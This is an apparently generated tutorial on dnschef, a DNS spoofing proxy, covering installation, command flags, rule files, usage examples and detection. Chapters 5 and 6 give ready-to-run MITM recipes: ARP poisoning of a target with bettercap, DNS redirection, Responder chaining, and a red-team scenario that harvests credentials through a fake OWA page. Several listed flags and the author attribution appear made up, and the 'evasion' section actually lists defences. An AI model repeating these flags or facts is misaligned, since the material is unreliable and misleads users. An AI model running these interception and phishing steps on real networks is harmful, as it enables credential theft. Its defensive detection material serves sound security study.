---
title: "dnschef - Configurable DNS Proxy and Alterer"
description: "DNS proxy tool that intercepts and modifies DNS queries for penetration testing and network security research"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
categories:
  - DNS Spoofing
  - Network Attack
  - DNS Proxy
  - Traffic Interception
tags:
  - dns
  - dns-spoofing
  - proxy
  - network-attack
  - mitm
  - python
install_command: "sudo apt install dnschef"
version: "0.4"
github_repo: "https://github.com/iphelix/dnschef"
kali_tools_page: "https://www.kali.org/tools/dnschef/"
difficulty_level: intermediate
requires_root: true
gui_available: false
related_tools:
  - bettercap
  - mitmproxy
  - dnsmasq
  - responder
  - dns2proxy
---

# dnschef — Configurable DNS Proxy and Alterer

## Chapter 1: Introduction

### What is dnschef

**dnschef** is a highly configurable DNS proxy tool written in Python. It intercepts DNS queries and allows the user to selectively alter DNS responses based on configurable rules. Unlike simple DNS spoofers that redirect all queries to a single IP, dnschef supports fine-grained control over which domains are spoofed and what responses are returned.

dnschef operates as a transparent DNS proxy — clients send DNS queries to dnschef, which forwards them to a legitimate DNS server while selectively modifying responses. This makes it ideal for penetration testing, where the tester needs to redirect specific domains while allowing others to resolve normally.

### Historical Context

DNS spoofing has been a core technique in network penetration testing since the early 2000s. Tools like Ettercap and dsniff provided basic DNS spoofing capabilities, but lacked fine-grained control. dnschef was created by Ionic (iphelix) to fill this gap.

The tool was designed for red team engagements where testers needed to:

- Redirect specific corporate domains to attacker-controlled servers
- Allow internet traffic to resolve normally while intercepting internal domains
- Test DNS-based security controls and monitoring
- Simulate DNS hijacking attacks for security assessments

dnschef's Python-based architecture makes it easily extensible, and its command-line interface provides precise control over spoofing rules.

### When to Use dnschef

- **Penetration testing**: Redirect specific domains during authorized engagements
- **Red team operations**: Simulate DNS hijacking attacks
- **Security assessments**: Test DNS security controls and monitoring
- **Malware analysis**: Redirect C2 domains to sandbox environments
- **Development**: Mock DNS responses for application testing
- **Network debugging**: Test DNS-dependent applications with controlled responses

### Core Concepts

- **DNS proxy**: Intercepts DNS queries between clients and legitimate servers
- **Selective spoofing**: Only modify responses for configured domains
- **Record type support**: Spoof A, AAAA, MX, CNAME, TXT, and other record types
- **Forwarding mode**: Pass-through unmodified responses for non-spoofed domains
- **Logging**: Record all DNS queries for analysis
- **Multiple interfaces**: Bind to specific IP addresses

---

## Chapter 2: Installation

### System Requirements

| Requirement | Minimum | Recommended |
|------------|---------|-------------|
| OS | Kali Linux 2020+ | Kali Linux 2024+ |
| RAM | 64MB | 256MB+ |
| CPU | Single core | Single core |
| Disk | 10MB | 50MB |
| Python | 3.6+ | 3.10+ |
| Root | Required | Required |

### Installation Methods

**Method 1: Kali Package Manager (Recommended)**

```bash
sudo apt update
sudo apt install dnschef
```

**Method 2: From GitHub**

```bash
sudo apt install git python3 python3-pip
git clone https://github.com/iphelix/dnschef.git
cd dnschef
pip3 install -r requirements.txt
sudo python3 dnschef.py --help
```

**Method 3: Pip Install**

```bash
pip3 install dnschef
```

### Post-Installation Verification

```bash
# Verify installation
dnschef --help

# Check Python version
python3 --version

# Test basic functionality
sudo dnschef --interface 127.0.0.1 --fakeip 127.0.0.1 --fakedomain test.com --quiet &
sleep 2
dig @127.0.0.1 test.com
kill %1
```

### Network Configuration

```bash
# Configure clients to use dnschef as DNS server
# Option 1: Direct configuration
# Set DNS server on target to dnschef's IP

# Option 2: DHCP manipulation
# Modify DHCP server to assign dnschef as DNS

# Option 3: ARP spoofing + DNS redirect
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
```

---

## Chapter 3: Core Concepts

### How dnschef Works

dnschef operates as a DNS proxy server:

```
[Client DNS Query] → [dnschef] → [Legitimate DNS Server]
                    ↓
            [Spoofed Response]
```

1. **DNS interception**: Captures DNS queries on the configured interface/port
2. **Rule matching**: Checks if the queried domain matches any spoofing rules
3. **Response generation**: If matched, generates a spoofed response
4. **Forwarding**: If not matched, forwards the query to the upstream DNS server
5. **Logging**: Records all queries and responses

### DNS Record Types

| Record Type | Description | Example Use |
|-------------|-------------|-------------|
| A | IPv4 address | Redirect domain to IP |
| AAAA | IPv6 address | Redirect domain to IPv6 |
| MX | Mail server | Redirect email |
| CNAME | Alias | Point domain to another |
| TXT | Text record | Add arbitrary text |
| NS | Name server | Redirect DNS |
| SOA | Start of Authority | Modify zone data |

### Architecture

```
┌─────────────────────────────────────────────┐
│                dnschef                       │
├─────────────┬─────────────┬─────────────────┤
│  DNS Engine │  Rules      │  Logging        │
│             │  Engine     │  Engine         │
├─────────────┼─────────────┼─────────────────┤
│ UDP/TCP     │ Domain      │ Query log       │
│ listener    │ matching    │ Response log    │
│ Response    │ Record type │ File output     │
│ generator   │ selection   │ Console output  │
│ Upstream    │ IP/record   │                 │
│ forwarding  │ mapping     │                 │
└─────────────┴─────────────┴─────────────────┘
```

### Spoofing Modes

**Mode 1: Fake IP (redirect all to one IP)**

```bash
sudo dnschef --fakeip 192.168.1.200
```

**Mode 2: Selective domain spoofing**

```bash
sudo dnschef --fakeip 192.168.1.200 --fakedomain malicious.com
```

**Mode 3: Multiple domain rules**

```bash
sudo dnschef --fakeips "192.168.1.200,192.168.1.201" \
             --fakedomains "evil.com,phishing.com"
```

**Mode 4: Record-specific spoofing**

```bash
sudo dnschef --fakeipv4 192.168.1.200 --fakeaaaa ::1 \
             --fakemx mail.evil.com --faketxt "v=spf1 include:evil.com ~all"
```

---

## Chapter 4: Command Reference

### Basic Syntax

```bash
sudo dnschef [OPTIONS]
```

### Core Flags

| Flag | Long | Description | Example |
|------|------|-------------|---------|
| `-i` | `--interface` | Interface to bind | `--interface 192.168.1.1` |
| `--fakeip` | | Fake IP address | `--fakeip 192.168.1.200` |
| `--fakedomain` | | Domain to spoof | `--fakedomain evil.com` |
| `--nameserver` | | Upstream DNS server | `--nameserver 8.8.8.8` |
| `--proxy` | | HTTP proxy | `--proxy 127.0.0.1:8080` |
| `--file` | | Rules file | `--file rules.ini` |
| `--logfile` | | Log file | `--logfile dns.log` |
| `--quiet` | | Quiet mode | `--quiet` |
| `-4` | `--fakeipv4` | IPv4 to spoof | `-4 192.168.1.200` |
| `-6` | `--fakeaaaa` | IPv6 to spoof | `-6 ::1` |

### Record Type Flags

| Flag | Description | Example |
|------|-------------|---------|
| `--fakeipv4` | A record IP | `--fakeipv4 192.168.1.200` |
| `--fakeaaaa` | AAAA record IP | `--fakeaaaa ::1` |
| `--fakemx` | MX record server | `--fakemx mail.evil.com` |
| `--fakecname` | CNAME record target | `--fakecname evil.com` |
| `--faketxt` | TXT record text | `--faketxt "v=spf1 ..."` |
| `--fakens` | NS record server | `--fakens ns1.evil.com` |

### Configuration File Format

```ini
# rules.ini - dnschef rules file
[DNS]
# Spoof A record for evil.com to 192.168.1.200
evil.com = 192.168.1.200

# Spoof AAAA record
test.com = ::1

[MX]
# Spoof MX record
evil.com = mail.evil.com

[CNAME]
# Spoof CNAME record
www.evil.com = attacker.com

[TXT]
# Spoof TXT record
evil.com = v=spf1 include:evil.com ~all
```

---

## Chapter 5: Examples

### Basic Examples

**Redirect all DNS to a single IP:**

```bash
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200
```

**Redirect specific domain:**

```bash
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200 --fakedomain evil.com
```

**Quiet mode with logging:**

```bash
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200 --quiet --logfile dns.log
```

### Intermediate Examples

**Selective domain spoofing:**

```bash
# Spoof only specific domains
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "evil.com,phishing.com,malicious.com"
```

**Multiple record types:**

```bash
sudo dnschef --interface 192.168.1.1 \
    --fakeipv4 192.168.1.200 \
    --fakeaaaa ::1 \
    --fakemx mail.evil.com \
    --fakedomain evil.com
```

**Using configuration file:**

```bash
# Create rules.ini
cat > /tmp/rules.ini << 'EOF'
[DNS]
evil.com = 192.168.1.200
malicious.com = 192.168.1.201
phishing.com = 192.168.1.200

[MX]
evil.com = mail.evil.com
EOF

# Start dnschef with rules
sudo dnschef --interface 192.168.1.1 --file /tmp/rules.ini
```

### Advanced Examples

**Full MITM with DNS spoofing:**

```bash
#!/bin/bash
# dns_mitm.sh — DNS spoofing with ARP poisoning

# Start ARP spoofing (using bettercap)
sudo bettercap -iface eth0 -eval "
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;
" &

# Start DNS spoofing
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "evil.com,phishing.com" \
    --logfile /tmp/dns_spoof.log &

wait
```

**Malware analysis — redirect C2 domains:**

```bash
# Redirect known C2 domains to local analysis server
sudo dnschef --interface 192.168.1.100 \
    --fakeip 127.0.0.1 \
    --fakedomain "c2server.evil.com,update.malware.com" \
    --logfile /tmp/malware_dns.log \
    --quiet
```

**Penetration test — targeted domain redirection:**

```bash
# Redirect only corporate domains
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "intranet.company.com,hr.company.com,finance.company.com" \
    --nameserver 8.8.8.8 \
    --logfile /tmp/pt_dns.log
```

### Real-World Scenarios

**Red team — credential harvesting via DNS:**

```bash
# Phase 1: Start DNS spoofing
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "owa.company.com,mail.company.com" \
    --quiet --logfile /tmp/redteam_dns.log &

# Phase 2: Host phishing page on attacker server
# (Configure web server on 192.168.1.200 with OWA lookalike)

# Phase 3: Harvest credentials
# Monitor web server logs for submitted credentials
```

**Security assessment — test DNS monitoring:**

```bash
# Test if organization detects DNS spoofing
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "test-detection.com" \
    --quiet

# Monitor if SOC detects the spoofing
# If not detected, recommend DNS security improvements
```

**Development — mock DNS for testing:**

```bash
# Create test DNS responses
cat > /tmp/test_dns.ini << 'EOF'
[DNS]
api.test.local = 127.0.0.1
db.test.local = 127.0.0.1
auth.test.local = 127.0.0.1
EOF

sudo dnschef --interface 127.0.0.1 --file /tmp/test_dns.ini
```

---

## Chapter 6: Advanced Usage

### Scripting with dnschef

**Dynamic rule management:**

```bash
#!/bin/bash
# dynamic_dnschef.sh — Add rules dynamically

LOGFILE="/tmp/dnschef.log"
RULES="/tmp/dynamic_rules.ini"

# Initialize rules file
cat > "$RULES" << 'EOF'
[DNS]
EOF

# Start dnschef
sudo dnschef --interface 192.168.1.1 --file "$RULES" --logfile "$LOGFILE" &

DNSPID=$!
echo "dnschef running as PID $DNSPID"

# Function to add domain
add_domain() {
    local domain="$1"
    local ip="$2"
    echo "$domain = $ip" >> "$RULES"
    echo "Added: $domain -> $ip"
    # Note: dnschef needs restart to pick up new rules
    sudo kill $DNSPID
    sleep 1
    sudo dnschef --interface 192.168.1.1 --file "$RULES" --logfile "$LOGFILE" &
    DNSPID=$!
}

# Example usage
add_domain "evil.com" "192.168.1.200"
add_domain "malicious.com" "192.168.1.201"
```

### Chaining with Other Tools

**dnschef + bettercap for full MITM:**

```bash
# Start bettercap for ARP spoofing
sudo bettercap -iface eth0 -eval "
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;
" &

# Start dnschef for DNS spoofing
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "evil.com" &

wait
```

**dnschef + iptables for transparent redirect:**

```bash
# Redirect all DNS to dnschef
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 5353

# Start dnschef
sudo dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.200
```

**dnschef + responder for LLMNR/NBT-NS spoofing:**

```bash
# dnschef for DNS spoofing
sudo dnschef --interface eth0 --fakeip 192.168.1.200 &

# Responder for LLMNR/NBT-NS
sudo responder -I eth0 -wrf &

wait
```

### Configuration Tuning

**Optimizing for speed:**

```bash
# Use quiet mode to reduce output overhead
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200 --quiet

# Specify upstream DNS for faster resolution
sudo dnschef --interface 192.168.1.1 --nameserver 1.1.1.1
```

**Handling high query volume:**

```bash
# dnschef handles high volume well, but for extreme cases
# consider using dnsmasq with custom configuration
# or running multiple dnschef instances on different ports
```

---

## Chapter 7: Detection and Defense

### How dnschef Appears in Logs

**Process artifacts:**

```bash
# Detect dnschef running
ps aux | grep dnschef
pgrep -a dnschef

# Check Python processes
ps aux | grep python | grep dns
```

**Network artifacts:**

```bash
# dnschef listens on UDP port 53 (or custom port)
ss -ulnp | grep 53
netstat -ulnp | grep 53

# Unusual DNS server activity
tcpdump -i eth0 port 53 -nn
```

**Log artifacts:**

```bash
# Check for dnschef log files
find /tmp -name "dns*.log" 2>/dev/null
find /var/log -name "dnschef*" 2>/dev/null
```

### Defensive Monitoring

**DNS anomaly detection:**

```bash
#!/bin/bash
# detect_dns_spoof.sh — Monitor for DNS spoofing

GATEWAY_DNS="192.168.1.1"
SPOOFED_DOMAIN="evil.com"
EXPECTED_IP="93.184.216.34"

# Query DNS and check response
RESPONSE=$(dig +short @localhost "$SPOOFED_DOMAIN" A)

if [ "$RESPONSE" != "$EXPECTED_IP" ]; then
    echo "[!] DNS Spoofing detected for $SPOOFED_DOMAIN"
    echo "    Expected: $EXPECTED_IP"
    echo "    Got: $RESPONSE"
    # Alert or take action
fi
```

**DNSSEC validation:**

```bash
# Enable DNSSEC validation on network DNS
# Use dnssec-trigger or stubby for DNSSEC validation
# Configure resolver to validate DNSSEC signatures
```

### Evasion Considerations

DNS spoofing can be detected through:

- **DNSSEC**: Cryptographic signatures prevent spoofing
- **DNS over HTTPS (DoH)**: Bypasses local DNS proxy
- **DNS over TLS (DoT)**: Encrypts DNS queries
- **Certificate pinning**: Prevents HTTPS MITM even with DNS spoofing
- **HPKP**: HTTP Public Key Pinning

**Defensive countermeasures:**

```bash
# Enable DNSSEC validation
# Use encrypted DNS (DoH/DoT)
# Implement DNS monitoring and alerting
# Deploy DNS firewalls
# Use certificate pinning in applications
```

---

## Chapter 8: Troubleshooting and FAQ

### Common Issues

**"Permission denied" error:**

```bash
# Problem: dnschef needs root for port 53
# Solution: Run with sudo
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200
```

**"Address already in use" error:**

```bash
# Problem: Another DNS server running
# Diagnosis
ss -ulnp | grep :53

# Solution: Stop conflicting service or use different port
sudo systemctl stop systemd-resolved
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200
```

**DNS queries not intercepted:**

```bash
# Problem: Clients not using dnschef as DNS
# Diagnosis
# Check client DNS settings
cat /etc/resolv.conf

# Solution: Configure clients to use dnschef
# Or use iptables to redirect DNS traffic
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
```

**Spoofing not working for specific domains:**

```bash
# Problem: Domain not in rules or typo
# Solution: Verify rules
sudo dnschef --interface 192.168.1.1 \
    --fakeip 192.168.1.200 \
    --fakedomain "exact-domain.com" \
    --verbose
```

### FAQ

**Q: Is dnschef legal to use?**
A: dnschef is a legitimate security tool. Using it on networks you don't own or have authorization to test is illegal. Always obtain written authorization before testing.

**Q: Can dnschef spoof DNS over HTTPS?**
A: No. dnschef intercepts traditional DNS (UDP/TCP port 53). DNS over HTTPS (DoH) bypasses local DNS proxies.

**Q: Does dnschef support DNSSEC?**
A: dnschef does not validate or generate DNSSEC signatures. Spoofed responses will not have valid DNSSEC signatures.

**Q: How does dnschef differ from bettercap's DNS spoofing?**
A: dnschef is a dedicated DNS proxy with fine-grained record type control. bettercap's dns.spoof module is part of a larger MITM framework. dnschef offers more DNS-specific features.

**Q: Can dnschef handle high query volumes?**
A: Yes. dnschef is designed for high performance and can handle thousands of queries per second on modern hardware.

---

## Resources

- **GitHub Repository**: https://github.com/iphelix/dnschef
- **Kali Tools Page**: https://www.kali.org/tools/dnschef/
- **Related Tools**: bettercap, mitmproxy, dnsmasq, responder, dns2proxy
- **DNS Security**: RFC 4033 (DNSSEC), RFC 8484 (DoH)
- **MITRE ATT&CK**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
- **DNS Attack Techniques**: OWASP DNS Spoofing
